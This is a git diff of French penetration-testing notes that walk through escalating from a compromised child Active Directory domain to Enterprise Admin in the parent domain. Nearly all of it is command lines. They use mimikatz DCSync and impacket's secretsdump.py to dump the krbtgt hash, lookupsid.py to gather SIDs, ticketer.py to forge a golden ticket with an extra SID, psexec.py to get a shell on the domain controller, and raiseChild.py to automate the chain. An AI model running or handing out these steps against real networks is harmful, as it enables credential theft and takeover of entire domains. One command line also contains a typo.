@@ -8,6 +8,7 @@
 4-FQDN du domaine enfant
 5-SID du groupe 'Enterprise Admins' du domaine parent
 
+------ Depuis WINDOWS -----
 Mimikatz:
 1 & 2 & 4 - mimikatz --> lsadump::dcsync /user:<DOMAIN>\krbtgt
 
@@ -25,4 +26,21 @@ Puis confirmer avec: klist et le C:// du dc (avec "ls")
 Confirmation possible avec DCSync Attack contre un admin du domaine parent:
 mimikatz --> lsadump::dcsync /user:<domain>\<user_adm>
 Si le domaine du user n'est pas le même que le domaine de la target
-mimkatz --> lsadump::dcsync /user:<domain>\<user_adm> /domain:<domain_cible>
+mimikatz --> lsadump::dcsync /user:<domain>\<user_adm> /domain:<domain_cible>
+
+------ Depuis LINUX -----
+#Recuperation des éléments
+1 - DCSync avec Secretsdump.py pour recuperer le hash NTLM de krbtgt
+secretsdump.py <CHILD_DOMAIN_FQDN>/<ADM_OWNED>@<IP> -just-dc-user <CHILD_DOMAIN>/krbtgt
+2 - lookupsid.py <DOMAIN_CHILD_fqdn>/<ADM_OWNED>@<IP> | grep "Domain SID"
+5 - Récuperer le Domain SID du Domaine parent: lookupsid.py <DOMAIN_CHILD_fqdn>/<ADM_OWNED>@<IP_DC> | grep -B12 "Enterprise Admins"
+Attacher le RID du groupe "Enterprise Admins" ("-519" ou https://adsecurity.org/?p=1001)
+
+#Golden ticket avec ticketer (manuel)
+ticketer.py -nthash <1> -domain <4> -domain-sid <2> -extra-sid <5> <3>
+Puis set la variable env KRB5CCNAME: export KRB5CCNAME=<3>.ccache
+controler avec klist
+Shell: psexec.py <CHILD_DOMAIN_fqdn>/<3>@<fqdn_dc> -k -no-pass -target-ip <dc_ip>
+
+#Golden ticket avec impacket-raiseChild.py (auto)
+raiseChild.py -arget-exec <dc_ip> <CHILD_Domain_fqdn>/<DOM_ADM_OWNED>
